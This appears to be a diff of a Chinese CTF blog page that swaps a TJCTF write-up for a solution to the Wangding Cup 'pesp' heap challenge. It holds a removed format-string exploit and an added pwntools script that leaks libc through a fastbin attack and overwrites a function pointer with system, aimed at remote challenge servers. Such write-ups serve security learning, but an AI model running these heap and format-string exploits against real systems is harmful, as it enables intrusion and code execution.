@@ -8,33 +8,32 @@
 
 <title>
   
-    tjctf记录
+    网鼎杯第三场pesp题解
   
 </title>
 
-<meta name="description" content="前言看着ctftime上的时间表参加了tjctf的比赛。pwn，re题目非常简单，在今天结束最高到了第二名.(pwn,re做完了，misc太菜)。虽然题目非常简单，类似于国内ISCC，还是简单的做个记录">
+<meta name="description" content="题目保护未开启PIE">
 <meta name="keywords" content="CTF">
 <meta property="og:type" content="article">
-<meta property="og:title" content="tjctf记录">
-<meta property="og:url" content="http://yoursite.com/2018/08/07/tjctf记录/index.html">
+<meta property="og:title" content="网鼎杯第三场pesp题解">
+<meta property="og:url" content="http://yoursite.com/2018/08/27/网鼎杯第三场pesp题解/index.html">
 <meta property="og:site_name" content="pwndog&#39;s blog">
-<meta property="og:description" content="前言看着ctftime上的时间表参加了tjctf的比赛。pwn，re题目非常简单，在今天结束最高到了第二名.(pwn,re做完了，misc太菜)。虽然题目非常简单，类似于国内ISCC，还是简单的做个记录">
+<meta property="og:description" content="题目保护未开启PIE">
 <meta property="og:locale" content="CN">
-<meta property="og:image" content="http://yoursite.com/2018/08/07/tjctf记录/1.png">
-<meta property="og:image" content="http://yoursite.com/2018/08/07/tjctf记录/2.png">
-<meta property="og:image" content="http://yoursite.com/2018/08/07/tjctf记录/3.jpg">
-<meta property="og:image" content="http://yoursite.com/2018/08/07/tjctf记录/4.png">
-<meta property="og:image" content="http://yoursite.com/2018/08/07/tjctf记录/6.png">
-<meta property="og:image" content="http://yoursite.com/2018/08/07/tjctf记录/5.png">
-<meta property="og:image" content="http://yoursite.com/2018/08/07/tjctf记录/7.png">
-<meta property="og:image" content="http://yoursite.com/2018/08/07/tjctf记录/8.png">
-<meta property="og:image" content="http://yoursite.com/2018/08/07/tjctf记录/9.png">
-<meta property="og:image" content="http://yoursite.com/2018/08/07/tjctf记录/10.png">
-<meta property="og:updated_time" content="2018-08-07T14:50:11.702Z">
+<meta property="og:image" content="http://yoursite.com/2018/08/27/网鼎杯第三场pesp题解/1.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/27/网鼎杯第三场pesp题解/2.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/27/网鼎杯第三场pesp题解/3.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/27/网鼎杯第三场pesp题解/4.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/27/网鼎杯第三场pesp题解/5.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/27/网鼎杯第三场pesp题解/6.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/27/网鼎杯第三场pesp题解/7.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/27/网鼎杯第三场pesp题解/8.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/27/网鼎杯第三场pesp题解/9.png">
+<meta property="og:updated_time" content="2018-08-27T08:10:43.398Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="tjctf记录">
-<meta name="twitter:description" content="前言看着ctftime上的时间表参加了tjctf的比赛。pwn，re题目非常简单，在今天结束最高到了第二名.(pwn,re做完了，misc太菜)。虽然题目非常简单，类似于国内ISCC，还是简单的做个记录">
-<meta name="twitter:image" content="http://yoursite.com/2018/08/07/tjctf记录/1.png">
+<meta name="twitter:title" content="网鼎杯第三场pesp题解">
+<meta name="twitter:description" content="题目保护未开启PIE">
+<meta name="twitter:image" content="http://yoursite.com/2018/08/27/网鼎杯第三场pesp题解/1.png">
 
 
   <link rel="alternative" href="/atom.xml" title="pwndog&#39;s blog" type="application/atom+xml">
@@ -168,17 +167,17 @@
       
         <div style="max-width: 1000px">
       
-          <article id="post-tjctf记录" class="article article-type-post">
+          <article id="post-网鼎杯第三场pesp题解" class="article article-type-post">
   
     <h1 class="article-header">
-      tjctf记录
+      网鼎杯第三场pesp题解
     </h1>
   
   
 
   <div class="article-info">
     <span class="article-date">
-  2018-08-07
+  2018-08-27
 </span>
 
     
@@ -191,37 +190,78 @@
 
   </div>
   <div class="article-entry">
-    <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>看着ctftime上的时间表参加了tjctf的比赛。pwn，re题目非常简单，在今天结束最高到了第二名.(pwn,re做完了，misc太菜)。虽然题目非常简单，类似于国内ISCC，还是简单的做个记录<br><img src="/2018/08/07/tjctf记录/1.png" alt="第一天排名"><br><a id="more"></a></p>
-<h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>简单直接的栈溢出，覆盖到之后的变量就可以得到flag，签到<br><img src="/2018/08/07/tjctf记录/2.png" alt=""><br><img src="/2018/08/07/tjctf记录/3.jpg" alt=""></p>
-<h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p>使用srand(time(NULL));通过随机数伪造canary防止栈溢出。<br><img src="/2018/08/07/tjctf记录/4.png" alt=""><br>time（NULL）取到的时间以秒做单位，学到可以通过加载so文件使用time文件得到相同的随机值。<br><img src="/2018/08/07/tjctf记录/6.png" alt=""><br>过了伪造canary直接就可以溢出拿到flag<br><img src="/2018/08/07/tjctf记录/5.png" alt=""></p>
-<h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><p><img src="/2018/08/07/tjctf记录/7.png" alt=""><br>题目逻辑就是定义了这么一个结构体，names长度为8，<br>如果strength指针指向位置的最多8个字节的总大小为400可以得到flag。<br>程序存在数组越界，可以输入9次数据，name数组保存的为malloc的地址，堆内容可控。<br>于是输入9次覆盖strength指针，指向的堆又可控，轻松凑出400拿到flag。</p>
-<h3 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h3><p><img src="/2018/08/07/tjctf记录/8.png" alt=""><br>栈溢出，前面可以向bss段写入33字节，配合栈溢出拿到flag,手动使用x64写了一下shellcode。<br><img src="/2018/08/07/tjctf记录/9.png" alt=""></p>
-<h3 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h3><p>经典的格式化字符串，本来以为会出一道难一点的。结果是我高估他了。题目给了一个函数直接读取flag，可以通过格式化字符串修改exit got表，同时没有开ASLR。一步搞定，我还以为是改成system拿权限。郁闷直接上代码</p>
-<pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
-p=remote(<span class="string">'problem1.tjctf.org'</span>,<span class="number">8008</span>)
+    <h3 id="题目保护"><a href="#题目保护" class="headerlink" title="题目保护"></a>题目保护</h3><p><img src="/2018/08/27/网鼎杯第三场pesp题解/1.png" alt=""><br>未开启PIE<br><a id="more"></a></p>
+<h3 id="题目流程"><a href="#题目流程" class="headerlink" title="题目流程"></a>题目流程</h3><p><img src="/2018/08/27/网鼎杯第三场pesp题解/2.png" alt=""><br>菜单，功能齐全<br><img src="/2018/08/27/网鼎杯第三场pesp题解/3.png" alt=""><br>show功能。无漏洞点<br><img src="/2018/08/27/网鼎杯第三场pesp题解/4.png" alt=""><br>add功能，可申请99个任意大小的堆块<br><img src="/2018/08/27/网鼎杯第三场pesp题解/5.png" alt=""><br>edit功能，可填入任意大小的内容。存在明显的堆溢出漏洞。<br><img src="/2018/08/27/网鼎杯第三场pesp题解/6.png" alt=""><br>free功能。无漏洞<br><img src="/2018/08/27/网鼎杯第三场pesp题解/7.png" alt=""><br>程序首先malloc了一个0x20大小的堆块。之后会调用这个堆块中0x8偏移中的地址。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h4><p>程序并没有给我们libc程序，所以我们首先需要泄露libc的版本和地址。<br>通过堆溢出可以轻松的制造出UAF漏洞进行使用。<br>这里我使用了fastbin attack通过bss段的stderr指针得到修改bss段的机会。也就可以覆盖bss段上保存堆地址的数组。通过修改堆地址为got表泄露出put和free两个函数的地址。<br><img src="/2018/08/27/网鼎杯第三场pesp题解/8.png" alt=""><br>通过libc search查到版本为libc2.23。<br>查询libc版本使用一个脚本先跑出来。再通过libc版本写下一个脚本<br>之后通过UAF再次泄露出一个unsorted bin的地址。<br>此时我们已经得到libc的基址和system函数的地址。</p>
+<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>通过UAF可以制造出fastbin attack修改申请的第一个堆块内容。将它的内容改为system地址即可完成利用。<br><img src="/2018/08/27/网鼎杯第三场pesp题解/9.png" alt=""></p>
+<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
+p=remote(<span class="string">'106.75.27.104'</span>,<span class="number">50514</span>)
+<span class="comment">#p=process(['./pwn33'],env={'LD_PRELOAD':'./libc2.23.so'})</span>
+e=ELF(<span class="string">'./libc2.23.so'</span>)
 context(log_level=<span class="string">'debug'</span>)
-elf=ELF(<span class="string">'./libc-2.27.so'</span>)
-elfa=ELF(<span class="string">'./8008'</span>)
-p.recvuntil(<span class="string">'First, choose a strong password to protect your message:'</span>)
-putsGOT1=elfa.got[<span class="string">'exit'</span>]
-main=<span class="number">0x08048713</span>
+p.recvuntil(<span class="string">'Your choice:'</span>)
+<span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(a,b)</span>:</span>
+    p.sendline(<span class="string">'2'</span>)
+    p.recvuntil(<span class="string">'Please enter the length of servant name:'</span>)
+    p.sendline(str(a))
+    p.recvuntil(<span class="string">'Please enter the name of servant:'</span>)
+    p.sendline(b)
+    p.recvuntil(<span class="string">'Your choice:'</span>)
+<span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(a)</span>:</span>
+    p.sendline(<span class="string">'4'</span>)
+    p.recvuntil(<span class="string">'Please enter the index of servant:'</span>)
+    p.sendline(str(a))
+    p.recvuntil(<span class="string">'Your choice:'</span>)
+<span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(a,b,c)</span>:</span>
+    p.sendline(<span class="string">'3'</span>)
+    p.recvuntil(<span class="string">'Please enter the index of servant:'</span>)
+    p.sendline(str(a))
+    p.recvuntil(<span class="string">'Please enter the length of servant name:'</span>)
+    p.sendline(str(b))
+    p.recvuntil(<span class="string">'Please enter the new name of the servnat:'</span>)
+    p.sendline(c)
+    p.recvuntil(<span class="string">'Your choice:'</span>)
 
-p.sendline(<span class="string">'123'</span>)
-p.recvuntil(<span class="string">'&gt;'</span>)
-X=main&amp;<span class="number">0x000000ff</span>
-X1=(main&amp;<span class="number">0x0000FF00</span>)&gt;&gt;<span class="number">8</span>
-X2=(main&amp;<span class="number">0x00ff0000</span>)&gt;&gt;<span class="number">16</span>
-X3=(main&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span>
-payload=p32(putsGOT1
-)+p32(putsGOT1+<span class="number">1</span>)
-payload+=<span class="string">"%."</span>+str(X<span class="number">-8</span>)+<span class="string">"x%35$hhn"</span>
-payload+=<span class="string">"%."</span>+str((X1-X)&amp;<span class="number">0xff</span>)+<span class="string">"x%36$hhn"</span>
-p.sendline(payload)
+
+
+create(<span class="number">200</span>,<span class="string">'123'</span>)
+
+create(<span class="number">0x10</span>,<span class="string">'123'</span>)<span class="comment">#1</span>
+
+create(<span class="number">200</span>,<span class="string">'123'</span>)
+create(<span class="number">200</span>,<span class="string">'123'</span>)
+dele(<span class="number">0</span>)
+edit(<span class="number">1</span>,<span class="number">0x200</span>,<span class="string">'a'</span>*<span class="number">0x10</span>+p64(<span class="number">0xf0</span>)+p64(<span class="number">0Xd0</span>))
+dele(<span class="number">2</span>)
+
+create(<span class="number">200</span>,<span class="string">'123'</span>)
+
+p.sendline(<span class="string">'1'</span>)
+p.recvuntil(<span class="string">'1 : '</span>)
+libc=u64(p.recvuntil(<span class="string">'3'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,chr(<span class="number">0</span>)))<span class="number">-0x3C4B78</span>
+system=libc+e.symbols[<span class="string">'system'</span>]
+<span class="keyword">print</span> hex(libc)
+create(<span class="number">0x10</span>,<span class="string">'aaa'</span>)
+create(<span class="number">0x10</span>,<span class="string">'aaa'</span>)
+create(<span class="number">0x10</span>,<span class="string">'aaa'</span>)<span class="comment">#2</span>
+dele(<span class="number">4</span>)
+dele(<span class="number">2</span>)
+p.sendline(<span class="string">'1'</span>)
+p.recvuntil(<span class="string">'1 : '</span>)
+h=u64(p.recvuntil(<span class="string">'3'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,chr(<span class="number">0</span>)))<span class="number">-0x110</span>
+<span class="keyword">print</span> hex(h)
+edit(<span class="number">1</span>,<span class="number">0x10</span>,p64(h))
+create(<span class="number">0x10</span>,<span class="string">'aaa'</span>)
+
+create(<span class="number">0x10</span>,p64(system)*<span class="number">2</span>)
+
+p.sendline(<span class="string">'5'</span>)
+
 
 p.interactive()
+
+
 </code></pre>
-<p><img src="/2018/08/07/tjctf记录/10.png" alt=""></p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>过于简单。但是学习了一下基于时间随机的不可靠性。<br>复习了格式化字符串，主要是自己一直想用system。浪费了不少时间<br>最近更新少，接下来没有比赛开始进行经典cve漏洞的调试过程。</p>
 
   </div>
   <footer class="article-footer">
